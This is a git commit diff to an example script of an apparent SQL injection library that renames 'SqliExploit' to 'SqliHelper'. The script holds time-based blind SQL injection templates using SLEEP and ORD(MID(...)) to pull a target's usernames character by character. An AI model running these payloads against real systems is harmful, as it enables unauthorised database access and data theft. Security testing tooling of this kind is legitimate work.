f6f0af180535f8833e42bb368e78028e01506ecf
Vu0r1 <118264404+Vu0r1-sec@users.noreply.github.com>
2023-01-23 14:19:03 +0100

    Update check.py

--- examples/check.py
+++ examples/check.py
@@ -22,26 +22,26 @@ def exec_request(request: str) -> bool:
 
 # Method 1 : check for the current request
 rq = "SELECT username FROM accounts ORDER BY username LIMIT 1,1"
-exploiter = SqliExploit(MySqlConfig(), exec_request)
+helper = SqliHelper(MySqlConfig(), exec_request)
 template_for_extract_string = Template(
     f'(SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,{sleep_duration},0))))a)'
 )
-exploiter.prepare_new(template=template_for_extract_string)
-if(exploiter.check(rq)):
+helper.prepare_new(template=template_for_extract_string)
+if(helper.check(rq)):
     print("Target is Vulnerable")
 else:
     print("Target is not Vulnerable")
 
 # if the request is invalid, the check fail
 rq = "SELECT username FROM invalid_table ORDER BY username LIMIT 1,1"
-if(exploiter.check(rq)):
+if(helper.check(rq)):
     print("Target is Vulnerable")
 else:
     print("Target is not Vulnerable")
 
 # Method 2 : generic check
 template_for_check = Template(f'(SELECT 1 FROM (SELECT(SLEEP({sleep_duration})))a)')
-if(exploiter.check(template=template_for_check)):
+if(helper.check(template=template_for_check)):
     print("Target is Vulnerable")
 else:
     print("Target is not Vulnerable")
